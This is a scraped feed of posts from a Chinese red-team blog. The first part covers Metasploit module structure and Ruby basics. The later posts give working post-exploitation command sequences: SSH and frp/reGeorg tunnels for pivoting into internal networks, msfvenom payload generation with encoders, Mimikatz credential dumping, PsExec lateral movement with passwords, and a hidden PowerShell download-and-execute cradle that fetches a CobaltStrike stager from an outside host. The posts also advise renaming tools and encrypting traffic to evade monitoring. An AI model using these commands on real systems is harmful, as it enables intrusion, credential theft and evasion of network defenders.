将HTTP响应解析为可以使用的变量 在这里会产生疑问，就是从代码上下文中根本不清楚函数的具体定义，该如何解决？这时就需要查询Metasploit API官方文档。 下面来具体查询分析下： run_host 在run方法中，作用是与所需主机建立连接。 begin意味着代码块的开始。 如果连接成功，就进行到connect方法，用于与目标服务器建立一个HTTP类型的连接。 之后使用send_request_raw方法，连接到服务器，创建请求，发送请求，读取响应。并将这个方法的参数URI的值设置为/，参数method的值设置为GET，将这个响应保存在res变量。 res = send_request_raw(&#123; &#39;uri&#39; =&gt; &#39;/&#39;, &#39;method&#39; =&gt; &#39;GET&#39; &#125;) 如果连接成功，使用http_fingerprint方法，记录和过滤信息。如：Set-cookie、Powered-by等。 接着再把收到的响应信息赋值给res，意味着将根据之前发送请求的响应数据进行特征匹配。 fp = http_fingerprint(:response =&gt; res) 之后对这些响应数据进行输出打印。 最后，rescue ::Timeout::Error, ::Errno::EPIPE 将会在模块超时的情况下处理程序的异常。 可见，输出的格式对应print_good(&quot;#&#123;ip&#125;:#&#123;rport&#125; #&#123;fp&#125;&quot;) if fp References Metasploit API Metasploit WIKI 《Mastering Metasploit - Third Edition》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—体系框架","slug":"打造定制化的Metasploit—体系框架","date":"2020-02-28T11:10:05.000Z","updated":"2021-01-27T05:20:36.531Z","comments":true,"path":"2020/0228/create-customized-metasploit—system-framework.html","link":"","permalink":"https://payloads.cn/2020/0228/create-customized-metasploit%E2%80%94system-framework.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn Metasploit框架结构Metasploit的体系框架结构示意图如下： 文件结构Metasploit中的文件结构如下： 目录 用途 lib 包含Metasploit模块的全部重要库文件 (Metasploit的核心与灵魂) modules 包含Metasploit中的所有模块 tools 包含用于辅助渗透测试的命令行程序 plugins 包含所有用于扩展Metasploit功能的插件，例如OpenVAS、Nessus… scripts 包含Meterpreter和其他各种脚本 库的布局Metasploit的模块是由各种各样的函数构成的。这些函数包括各种基础库文件以及使用Ruby 编写的通用程序。在使用这些函数之前，首先要知道这些函数是什么，如何使用这些函数，调用 函数时需要传递多少个参数?更重要的是，这些函数的返回值会是什么? 库的实际位置重要的rex库文件位于/lib目录下:（在/lib下还包含了各种服务的重要目录） 另外两个重要的库/base和/core位于/msf目录下: /msf/core库文件提供核心的辅助模块 core/exploits/目录是Metasploit模块广泛使用的库文件 core/目录下还可以找到支持各种类型模块的所有相关库文件(渗透、攻击载荷、后渗透、编码器和各种其他模块的core库) 重要文档通过以上对Metasploit框架结构的介绍，已经有所熟悉。接下来，在打造定制化的Metasploit过程中，可以结合官方文档，下面列出一些比较重要的文档供参考： 搭建Metasploit开发环境，创建一个专门用来开发的Metasploit版本 msf5：官方文档 中文文档 社区贡献指南，请参照官方给出的代码规范进行开发：官方文档 中文文档 Metasploit API，能够查询大量的类、模块、函数定义等等：官方文档 一些其他的开发技能，包括但不局限于 git使用、ruby 语法、Metasploit 使用了解等。 模块格式首先，开发的Metasploit模块，最好的办法就是先深入理解它现有模块的内部机制，看看是如何工作的。 Metasploit通用的框架头部如下： 12345678910111213141516171819require &#x27;msf/core&#x27;class MetasploitModule &lt; Msf::Auxiliary def initialize(info = &#123;&#125;) super( update_info( info, &#x27;Name&#x27; =&gt; &#x27;Sample Auxiliary Module&#x27;, # The description can be multiple lines, but does not preserve formatting. &#x27;Description&#x27; =&gt; &#x27;Sample Auxiliary Module&#x27;, &#x27;Author&#x27; =&gt; [&#x27;Joe Module &lt;joem@example.com&gt;&#x27;], &#x27;License&#x27; =&gt; MSF_LICENSE, ) ) end def run # Main function end 一个框架一般都会从使用require关键字导入重要的库文件开始，上面的代码就导入了msf/core库。所以，这个框架中就包含了msf目录下的core库文件。 接下来主要是使用MetasploitModule指定这个类的类型。在定义类型的那行中，需要定义类的用途。上面代码定义了类的用途为MSF::Auxiliary。 initialize方法是Ruby编程语言中的默认构造方法。在这个方法中，我们定义了名称 (Name)、描述(Description)、作者(Author)、许可(License)等。许可就是&#39;License&#39; =&gt; MSF_LICENSE。 辅助模块中的主函数是run方法，除非要使用特别多的方法,否则所有的操作都应该在这个函数里面执行。但是程序仍然要从run方法开始执行。 References Metasploit API Metasploit WIKI 《Mastering Metasploit - Third Edition》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—认识Ruby","slug":"打造定制化的Metasploit—认识Ruby","date":"2020-02-20T07:09:30.000Z","updated":"2021-01-27T05:19:49.061Z","comments":true,"path":"2020/0220/create-customized-metasploit—understand-ruby.html","link":"","permalink":"https://payloads.cn/2020/0220/create-customized-metasploit%E2%80%94understand-ruby.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言Ruby编程语言可以说是Metasploit框架的核心，想要学习好Metasploit模块编写必须要会Ruby。不过Ruby到底是什么呢？根据Ruby官方网站的说法：”Ruby一门开源的动态编程语言，注重简洁和效率。Ruby 的句法优雅，读起来自然，写起来舒适。”（引自Ruby中文官网）简单来说，Ruby是一种简单快捷的面向对象（面向对象程序设计）脚本语言。ruby 另以”红宝石”命名。 本文只讲解涉及编写Metasploit模块所必需的Ruby知识，如需更多介绍可以查阅Ruby教程，进行学习。 创建第一个ruby程序如需了解Ruby的安装过程，可自行百度，本文不进行讲解。 下载Ruby Ruby的交互式命令行这里直接使用Kali系统自带的Ruby环境，跟Python等语言一样，ruby也有命令交互的，输入irb即可进入到命令行交互操作。 下面做个 计算 与 赋值 的简单操作： 命令行中定义方法方法或函数是一组语句，当强调它们时就会执行。在使用Metasploit模块时，Ruby的方法是一个很重要的部分。语法格式： 123def method_name [( [arg [= default]]...[, * arg [, &amp;expr ]])] expr..end 首先已def开始，end声明放在最后来结束对方法的定义，arg指的是方法所接收的参数，expr指的是用来接受并计算的表达式。 下面定义一个函数方法： 可以看到，函数通过运算打印出了正确的结果。Ruby语言提供了puts和print这两种输出打印函数。当涉及Metasploit时，将使用print_line函数。 下面分别使用print_line、print_good、print_error、print_warning、print_status、与print_blank_line语句来表示行、成功执行、错误执行、警告、状态与换行： 12345678def run print_line(&quot;---&quot;) print_good(&quot;successful&quot;) print_error(&quot;error&quot;) print_warning(&quot;warning&quot;) print_status(&quot;status&quot;) print_blank_line end Ruby中的变量和数据类型变量是指一个值可以随时改变的占位符。Ruby语言支持众多的数据类型，但只讲解与Metasploit相关的数据类型。 字符串处理使用Ruby语言编写Metasploit模块时，尽量使用双引号标记，因为单引号可能会产生问题： 字符串连接将两个不同结果连接成一个字符串，使用+运算符实现字符串的连接；当需要一个变量后面追加数据的时候，可以使用&lt;&lt;运算符： 子字符串substring函数 split函数 Ruby中的数字和转换在处理用户输入是，可以用to_i函数将字符串类型的输入转换成数字；另外，可以用to_s函数将一个数字转换成字符串。 数制转换 16进制到10进制的转换 10进制到16进制的转换 范围范围(range)是一个很重要的内容，广泛应用在Metasploit的辅助模块中。例如auxiliary… 一个范围的对象提供多种操作：搜索、查找最小值与最大值、显示范围中的所有数据。这里include?函数可以检查范围中是否包含某一个特定的值。此外，min与max分别显示范围中的最小值和最大值。 Ruby中的循环迭代语句被称为循环。Ruby的语法和其他编程语言的不同之处： 123456def for1(a) for i in 0..a print (&quot;This number is #&#123;i&#125;\\n&quot;) endendfor1 (10) 这里使用#&#123;i&#125;去打印输出的变量i的值,关键字\\n指定开始新的一行。 而迭代循环是通过each实现的，在Metasploit模块中被广泛使用。 12345678def each_example(a) a.each do |i| print i.to_s + &quot;\\t&quot; endenda=Array.new(5)a=[5,10,15,20,25]each_example(a) 定义一个方法，并接收数组a，再用each循环打印出来。 References Metasploit API Metasploit WIKI 《Mastering Metasploit - Third Edition》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"SSH加密隧道之端口转发","slug":"SSH加密隧道之端口转发","date":"2020-01-09T05:35:28.000Z","updated":"2021-01-27T05:27:39.556Z","comments":true,"path":"2020/0109/port-forwarding-of-ssh-encrypted-tunnel.html","link":"","permalink":"https://payloads.cn/2020/0109/port-forwarding-of-ssh-encrypted-tunnel.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 简介SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据，还能够将其他TCP端口的网络数据通过SSH连接进行转发，并且自动提供了相应的加密及解密服务，这一过程被叫做“SSH隧道” (tunneling)。 SSH隧道加密传输，两大优势： 加密SSH Client 端至SSH Server 端之间的通讯数据 突破防火墙的限制完成一些之前无法建立的TCP 连接 SSH隧道加密传输， C/S 模式的架构，配置文件分为： 服务器端配置文件：/etc/ssh/sshd_config 客户端配置文件：/etc/ssh/ssh_config、用户配置文件~/.ssh/config 参数详解关于建立ssh隧道时所用到一些参数的详细解释： 1234567891011-C 压缩传输，加快传输速度-f 在后台对用户名密码进行认证-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行-q 安静模式，不要显示任何debug信息-l 指定ssh登录名-g 允许远程主机连接到本地用于转发的端口-L 进行本地端口转发-R 进行远程端口转发-D 动态转发，即socks代理-T 禁止分配伪终端-p 指定远程ssh服务端口 本地转发把本地端口数据转发到远程服务器，本地服务器作为SSH客户端及应用户端，称为正向 tcp 端口加密转发。 基础环境本地攻击机 10.11.42.99 ☁️VPS 192.168.144.174 ☁️目标Widnwos Web服务器(出网) 192.168.144.210 必要配置到☁️VPS192.168.144.174机器上修改 ssh 配置： 12345678# vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yesTCPKeepAlive yesPasswordAuthentication yes# service ssh restart 参数详解 AllowTcpForwarding 是否允许TCP转发，默认值为”yes”。 GatewayPorts 是否允许远程主机连接本地的转发端口，默认值是”no”。 GatewayPorts no 这可以防止连接到服务器计算机外部的转发端口。 GatewayPorts yes 这允许任何人连接到转发的端口。如果服务器在公共互联网上，互联网上的任何人都可以连接到端口。 GatewayPorts clientspecified 这意味着客户端可以指定一个IP地址，该IP地址允许连接到端口的连接。其命令是： ssh -R 1.1.1.1:8080:localhost:80 www.example.com 在这个例子中，只有来自IP地址为1.1.1.1且目标端口是8080的被允许。 TCPKeepAlive 指定系统是否向客户端发送 TCP keepalive 消息，默认值是”yes”。这种消息可以检测到死连接、连接不当关闭、客户端崩溃等异常。 可以理解成保持心跳，防止 ssh 断开。 具体流程先在本地攻击机执行ssh转发，之后用远程桌面连接本地的33389端口，实际是连接192.168.144.210的远程桌面。 简单说 就是通过☁️VPS这台机器把本地攻击机的33389端口转到了☁️目标服务器的3389端口上，也就是说这个ssh 隧道是建立在本地攻击机与☁️VPS之间的。 12ssh -C -f -N -g -L listen_port:DST_Host:DST_port user@Tunnel_Hostssh -C -f -N -g -L 33389:192.168.144.210:3389 root@192.168.144.174 -p 22 远程转发把远程端口数据转发到本地服务器，本地服务器作为SSH客户端及应用服务端，称为反向tcp端口加密转发。 基础环境☁️VPS 10.11.42.99 ☁️目标Linux Web服务器(出网) 192.168.144.174 目标Widnwos Web服务器(不出网) 192.168.144.210 必要配置现已获取☁️目标服务器(出网)权限，在该机器上修改 ssh 配置： 12345678# vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yesTCPKeepAlive yesPasswordAuthentication yes# service ssh restart 具体流程继续在☁️目标服务器(出网)执行ssh转发，通过 ☁️VPS这台机器，把来自外部的33389端口流量都转到目标服务器(不出网)的 3389 上。 12ssh -C -f -N -g -R listen_port:DST_Host:DST_port user@Tunnel_Hostssh -C -f -N -g -R 33389:192.168.144.210:3389 anonysec@10.11.42.99 -p 22 回到 ☁️VPS这台机器，查看33389端口是否处于监听状态。如果处于监听状态，则说明ssh隧道建立成功。 注意：隧道建立成功后，默认并非监听在 0.0.0.0，而是监听在 127.0.0.1，可以用rinetd再做一次本地转发。 先在☁️VPS上装好rinetd，之后在rinetd配置文件中添加一条转发规则。 123456apt install rinetd -yvim /etc/rinetd.conf0.0.0.0 3389 127.0.0.1 33389 #转发规则service rinetd start rinetd本地转发后，查看端口是否处于监听状态。 1netstat -an |egrep &quot;3389|33389&quot; 远程连接☁️VPS的3389端口，成功连接进入目标服务器(不出网)的远程桌面中。 动态转发动态端口转发实际上是建立一个ssh正向加密的socks4/5代理通道，任何支持socks4/5协议的程序都可以使用这个加密的通道来进行代理访问，称为正向加密socks。 基础环境☁️VPS 10.11.42.99 ☁️目标Linux Web服务器(出网) 192.168.144.174 目标Widnwos Web服务器(不出网) 192.168.144.210 目标Widnwos Web2服务器(不出网) 192.168.144.155 必要配置现已获取☁️目标服务器(出网)权限，在该机器上修改 ssh 配置： 12345678# vim /etc/ssh/sshd_configAllowTcpForwarding yesGatewayPorts yesTCPKeepAlive yesPasswordAuthentication yes# service ssh restart 具体流程在☁️VPS执行ssh转发，并查看10080端口是否处于监听状态。 123ssh -C -f -N -g -D listen_port user@Tunnel_Hostssh -C -f -N -g -D 10080 root@192.168.144.174 -p 22 #监听127.0.0.1ssh -C -f -N -g -D 0.0.0.0:10080 root@192.168.144.174 -p 22 #监听0.0.0.0 回到metasploit机器上，挂 socks 代理，扫描内网服务器MS17_010。 123456sudo msfconsole -qmsf5 &gt; setg proxies socks5:10.11.42.99:10080msf5 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.144.210msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 10msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run 双重加密利用”ssh隧道+rc4双重加密”去连接目标内网下指定机器上的meterpreter，让payload变的更加难以追踪。 首先，用msfvenom生成bind的rc4 payload，并将rc4.exe传入到目标Web2服务器(不出网)中，并执行。 1msfvenom -p windows/meterpreter/bind_tcp_rc4 rc4password=AnonySec lport=443 -f exe -o rc4.exe 回到metasploit机器上，挂 socks 代理，直接bind连接到目标内网中Web2服务器(不出网)的meterpreter下。 12345678sudo msfconsole -qmsf5 &gt; setg proxies socks5:10.11.42.99:10080msf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcp_rc4msf5 exploit(multi/handler) &gt; set rc4password AnonySecmsf5 exploit(multi/handler) &gt; set rhost 192.168.144.155msf5 exploit(multi/handler) &gt; set lport 443msf5 exploit(multi/handler) &gt; run -j 总结SSH隧道的实战利用，需要全方位考虑，本文只是讲述了SSH端口转发的思路，实际更需要去探索如何应对某些极端的目标内网环境！","categories":[{"name":"SSH隧道","slug":"SSH隧道","permalink":"https://payloads.cn/categories/SSH%E9%9A%A7%E9%81%93/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"实战中内网穿透的打法","slug":"实战中内网穿透的打法","date":"2020-01-05T13:35:48.000Z","updated":"2021-01-27T05:24:06.091Z","comments":true,"path":"2020/0105/how-to-penetrate-the-intranet-in-actual-combat.html","link":"","permalink":"https://payloads.cn/2020/0105/how-to-penetrate-the-intranet-in-actual-combat.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言在内网渗透时，一个WebShell或CobaltStrike、Metasploit上线等，只是开端，更多是要内网横向移动，扩大战果，打到核心区域。但后渗透的前提是需要搭建一条通向内网的“专属通道”，才能进一步攻击。可实战中因为网络环境不同，所利用的方式就不同。 以下为自我总结“实战中内网穿透的打法”思维导图： 目标出网（socks代理）这是实战中最愿意碰到的网络环境，目标机可以正常访问互联网，可直接在目标机挂socks代理或CobaltStrike上线，打通目标的内网通道。 Frp（socks5）Frp服务端配置文件： 12[common]bind_port = 8080 Frp客户端配置文件： 1234567891011121314[common]server_addr = xx.xx.xx.xxserver_port = 8080#服务端口使用Web常见端口[socks5]type = tcpremote_port = 8088plugin = socks5use_encryption = true use_compression = true#socks5口令#plugin_user = SuperMan#plugin_passwd = XpO2McWe6nj3 此处添加了加密压缩这两个功能，默认是不开启的，根据作者介绍，压缩算法使用的是 snappy。 use_encryption = true 启用加密 [通信内容加密传输，有效防止流量被拦截] use_compression = true 启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源] use_encryption = true 、use_compression = true 必须放在相关协议下面。 frp客户端与配置文件传到目标机后，把程序名与配置文件进行修改，并放在系统相关文件夹中，做到隐蔽。 加密压缩的对比这是frp客户端配置文件中未使用encryption 与compression功能，利用metasploit挂socks代理，扫描ms17_010传输的数据包，明显可辨别出具体攻击行为。如果目标内网有”态势感知“、流量分析等安全设备，就会被监测到，导致权限丢失。 使用encryption 与compression功能后，虽攻击源地址同样会暴露，但传输的数据包却无法辨别，规避了内网中的安全监测设备。 CobaltStrike (socks4a)到已控目标机的Beacon下将socks代理开启。 1beacon &gt; socks 1024 #端口根据VPS实际情况进行设置 菜单栏中的View &gt; Proxy Pivots，复制代理连接到Metasploit中，或直接将socks4a挂在相关安全工具中。 上线不出网机器这是link链接，只要主链路(出网机Beacon)掉线，均掉！ SMB Beacon官方对SMB Beacon的介绍：SMB Beacon是使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽。 创建一个SMB的Listener (host与port可无视)，注意Listener选择，在session中选择route可达的主机派生会话。 运行成功后，可以看到 ∞∞ 这个字符，这就是派生SMB Beacon的连接状态。 可在主Beacon上用link host链接或unlink host断开。 12beacon&gt; link 192.168.144.155beacon&gt; unlink 192.168.144.155 Link Listener在已上线的主机创建Listener。 导出该类型Listener对应的可执行文件或dll等。 选择刚建立的Listener。 上传刚才生成的payload到当前已上线的目标机中，这里用PsExec.exe 工具 。(CobalStrike本身psexec功能不够强大) 在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。 1beacon&gt; shell C:\\WINDOWS\\Temp\\PsExec.exe -accepteula \\\\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\\WINDOWS\\Temp\\beacon.exe 1beacon&gt; shell netstat -ano |findstr 4444 SSH Login12beacon&gt; ssh 192.168.144.174:22 root adminbeacon&gt; ssh 192.168.144.203:22 root admin 在Linux目标机中查看网络连接状态，实际是与之前已上线的Windows主机建立的连接。 目标不出网（http代理）目标机网络中可能有防火墙、网闸等，只允许http单向出，无法正常访问互联网，用上述socks方法是行不通的，只能用http代理进行渗透。 reGeorg (socks5)1python reGeorgSocksProxy.py -u http://192.168.144.211/tunnel.aspx -l 0.0.0.0 -p 10080 利用metasploit挂reGeorg socks代理，扫描ms17_010传输的数据包，明显可辨别攻击行为。 Neo-reGeorg (加密)1python neoreg.py -k test@123 -l 0.0.0.0 -p 10081 -u http://192.168.144.211/neo-tunnel.aspx 使用Neo-reGeorg后，数据包已被加密传输。 冰蝎 (开socks5)冰蝎的数据包传输是加密的，本身也具备socks代理功能，但传输过程中存在丢包情况。这里同样是利用metasploit探测ms17_010漏洞，结果显示不存在。当不设置代理探测时，实际漏洞是存在的。 虽然冰蝎的这种代理扫描方式不如reGeorg准确，但小线程的端口探测等是可行的，如 auxiliary/scanner/portscan/tcp。准确度更多是因某种探测或其他方式的数据包在传输过程中的多少而决定。 reduh (单端口转发)当目标服务器中间件等服务版本较低，reGeorg或冰蝎马等无法正常解析，就需要换用其它的http代理脚本。这是某实战中遇到的环境： 这里以reduh为例，虽然只能对指定的端口进行转发 (不适用图形化连接操作)，但可以先利用msfvenom生成正向的shell payload，再结合reduh单端口转发，上线metasploit，最后利用socks4a模块开代理。 下面把具体的流程走一遍： 12345sudo msfvenom --platform windows -p windows/shell_bind_tcp lport=53 -e x86/shikata_ga_nai -i 5 -f exe -o x86shell.exe--platform &lt;platform&gt; 指定payload的目标平台-e, --encoder &lt;encoder&gt; 指定需要使用的编码器-i, --iterations &lt;count&gt; 指定payload的编码次数 上传payload到目标服务器，并执行。 metasploit是监听转发后的地址与端口。 123456sudo msfconsole -qmsf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/shell_bind_tcpmsf5 exploit(multi/handler) &gt; set rhost 127.0.0.1msf5 exploit(multi/handler) &gt; set lport 5353msf5 exploit(multi/handler) &gt; run -j reDuhServer传到目标机后，使用reDuhClient进行连接，并将反弹的端口转本地后， 1234java -jar reDuhClient.jar http://103.242.xx.xx/reduh.aspxtelnet 127.0.0.1 1010 &gt;&gt;[createTunnel]5353:127.0.0.1:53 可在metasploit渗透，或开启一个socks4a，挂载其他安全工具上继续渗透。 123msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4amsf5 auxiliary(server/socks4a) &gt; set srvport 10080msf5 auxiliary(server/socks4a) &gt; run -j 注意为什么payload要用shell，而不用meterpreter。meterpreter是高级的payload，传输中占用大量数据包，这种单端口转发上线metasploit，本就不是很稳定，meterpreter会使“小水管”更加不稳定！ 隔离网络（多级代理）内网渗透中，会遇到隔离网络，更多时候是逻辑上的隔离，突破的办法就是拿到route可达的跳板机 (多张网卡、运维机等)的权限，建立一层二级代理、三级代理… frp现拿到一台双网卡内网服务器权限，可以用frp建立通道，这台服务器既是服务端也是客户端。 proxifier用frp建立好后，结合proxifier添加两条代理：外网socks、内网socks，之后创建代理链 。(注意代理顺序) 设置代理规则，选择对应代理。 二层代理成功，内网隔离机445探测开放。 Proxychains命令行代理神器proxychains，设置二层代理、socks口令。(注意代理顺序) 联动metasploit，ms17_010探测，可以看到代理链的传输过程。 Metasploit针对metasploit的利用，只要sessions中的route可达，就可以直接进行多层网络渗透，更加方便。但主session掉，均掉！ 在获取目标一个sessions 后，可以查看IP段信息并自动添加路由表。 123456msf5 exploit(multi/handler) &gt; sessions 1meterpreter &gt; run get_local_subnetsmeterpreter &gt; run autoroute -pmeterpreter &gt; run post/multi/manage/autoroutemeterpreter &gt; run autoroute -pmeterpreter &gt; background 上述是在meterpreter权限中添加，或当知道目标路由表信息时，可直接添加。 12msf5 exploit(multi/handler) &gt; route add 172.20.20.0/24 1 //session id 1msf5 exploit(multi/handler) &gt; route 可在metasploit继续渗透，或开启一个socks，挂载其他工具上多层穿透。 123msf5 exploit(multi/handler) &gt; use auxiliary/server/socks4amsf5 auxiliary(server/socks4a) &gt; set srvport 10080msf5 auxiliary(server/socks4a) &gt; run -j 总结内网穿透时，代理需要稳定、隐蔽，思路更需要不断的拓宽。毕竟在实战中，多么复杂的环境都会遇到，更多的是总结不同打法，进行落地，最终将内网的“大门”打开！ 有不同见解，或更优的方法可随时交流^_^","categories":[{"name":"总结","slug":"总结","permalink":"https://payloads.cn/categories/%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"CobaltStrike进阶篇-批量上线","slug":"CobaltStrike进阶篇-批量上线","date":"2019-12-12T18:00:36.000Z","updated":"2021-01-27T05:24:52.064Z","comments":true,"path":"2019/1213/.html","link":"","permalink":"https://payloads.cn/2019/1213/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言当获取一台目标服务器权限时，更多是想办法扩大战果，获取目标凭据并横向进行登陆是最快速的拿权方式。但目标所处环境是否可出网，如何利用CobalStrike进行批量上线，正是本文所要讲述的内容。 获取凭据目标机器CobalStrike上线后，通常先抓取该主机凭据，选择执行 Access–&gt;Run Mimikatz ，或在Beacon中执行logonpasswords命令。需要当前会话为管理员权限，才能成功，如果权限低，请先提权~ 点击工具栏的Credentials，可以看到获取的凭据信息。（Credentials可自行添加） 当然，不是每次都能成功获取到明文密码的，要看内存中是否存储。 目标机出网psexec传递获取凭据后，需要对目标网段进行端口存活探测，缩小范围。探测方式比较多，本文仅依托CobalStrike本身完成，不借助其他工具。因为是psexec传递登录，这里仅需探测445端口。（ psexec：在主机上使用服务派生会话 ） 使用portscan命令：ip网段 — ports端口 — 扫描协议（arp、icmp、none）— 线程（实战不要过高）。 1beacon&gt; portscan 192.168.144.0/24 445 arp 200 点击工具栏的View–&gt;Targets，查看端口探测后的存活主机。（Targets可自行添加） 选择Login–&gt;psexec传递登录。 选择之前获取到的凭据信息（明文密文均可），此处选择明文，并确定接收的Listener与主机的Session。 在Beacon中可以看到执行的命令，并会显示成功登录的ip，之后就便会上线CobalStrike。这样就控制了多个主机的系统权限。 附：psexec密文传递Beacon中执行的命令。【不是psexec(psh)选项】 目标机不出网Link Listener实战中往往还会遇到通过某种方式，获取到目标内网中某台主机的系统权限，但是该主机处在隔离网络中，不能出网。因为CobalStrike服务端是搭建在互联网中的，通过常规方式是无法上线的，这里就需要利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。 首先，在已上线的主机创建Listener，监听端口可自定义。 选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless)，支持导出该类型Listener对应的可执行文件或dll等。 注意，选择刚建立的Listener名字，Proxy可不设置，这里生成exe保存本地。(未免杀) 上传刚才生成的payload到当前已上线的目标机中，还需要上传另一个工具PsExec.exe 。（CobalStrike本身psexec功能不够强大，且方法不唯一） 在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。 1beacon&gt; shell C:\\WINDOWS\\Temp\\PsExec.exe -accepteula \\\\192.168.144.155,192.168.144.196 -u administrator -p admin@123 -d -c C:\\WINDOWS\\Temp\\beacon.exe 端口查看，实际不出网目标机（192.168.144.196）是与出网目标机（192.168.144.155）正在建立连接。 1beacon&gt; shell netstat -ano |findstr 4444 因为这是link链接，只要主链路（即出网机Listener）掉线，就都会掉线！ SSH登录ssh批量登录比较简单，同样利用当前已上线的目标机进行登录。 1beacon&gt; portscan 192.168.144.170-210 22 arp 200 在Credentials中添加ssh的口令信息。（ssh口令可事先通过其他方式获取，不建议用此工具进行ssh爆破，效率慢） 选择Login–&gt;ssh登录。 选择刚添加的ssh口令，主机Session，即从哪台主机连接过去。 ssh成功登录后，就实现了Linux目标机的上线，在Beacon中可以看到执行的命令。若需要上线的Linux主机不多，可直接在Beacon中执行命令。 在Linux目标机中查看网络连接状态，实际是与之前已上线的Windows主机建立的连接。 总结本文只是讲述针对不同环境的不同上线方式，利用CobalStrike对已获取权限的主机进行批量上线。不要把CobalStrike当成最优的端口探测与口令爆破方式，工具的特性并不在此。毕竟在内网中拿权要有效率，不能浪费太多时间，工具间要进行互补，发挥各自的优势。当然，上线的方式也不要局限此处！","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"CobaltStrike与Metasploit实战联动","slug":"CobaltStrike与Metasploit实战联动","date":"2019-12-10T16:22:29.000Z","updated":"2021-01-27T05:25:47.404Z","comments":true,"path":"2019/1211/cobaltstrike-and-metasploit-actual-combat-linkage.html","link":"","permalink":"https://payloads.cn/2019/1211/cobaltstrike-and-metasploit-actual-combat-linkage.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言CobalStrike 与 Metasploit 均是渗透利器，各有所长。前者更适合做稳控平台，后者则更擅长内网各类探测搜集与漏洞利用。两者更需要灵活的联动，各自相互依托，从而提升渗透的效率。 内置Socks功能通过Beacon内置的socks功能在VPS上开启代理端口，打通目标内网通道，之后将本地Metasploit直接带入目标内网，进行横向渗透。 当然，也可以把代理设置在其他的工具上，不限于Proxychains、Proxifier等。 首先，到已控目标机的Beacon下将socks代理开启。 1beacon &gt; socks 1024 #端口根据VPS实际情况进行设置 点开菜单栏中的View &gt; Proxy Pivots，复制代理连接到Metasploit中。 本地启动Metasploit，挂上代理，就可以对目标内网进行各种探测搜集。如 探测目标内网中存在MS17_010漏洞的主机，这也是内网拿主机权限利用方式之一。 123456msf5 &gt; setg Proxies socks4/5:ip:port #让msf所有模块的流量都通过此代理走。(setg全局设置)msf5 &gt; setg ReverseAllowProxy true #允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010msf5 &gt; set rhosts 192.168.144.0/24msf5 &gt; set threads 100 #内网渗透时线程不要太高！msf5 &gt; run 利用MSF模块上线Beacon shell当通过其它方式拿到了目标内网中某台Windows机器的本地管理员明文密码或hash时，可利用Metasploit下auxiliary/admin/smb/psexec_command模块，直接上线指定目标机器的Beacon shell。**(前提目标机可出网)** 先利用CobalStrike生成上线Beacon的powershell。 本地启动Metasploit，挂上代理，设置psexec_command模块参数。 12345678msf5 &gt; setg Proxies socks4/5:ip:portmsf5 &gt; use auxiliary/admin/smb/psexec_commandmsf5 &gt; set rhosts 192.168.144.0/24msf5 &gt; set threads 10msf5 &gt; set smbuser administratormsf5 &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 #明文、密文均可msf5 &gt; set command powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://149.28.xx.xx:80/a&#x27;))&quot; #上线CS的powershell，目标机存在杀软需考虑msf5 &gt; run 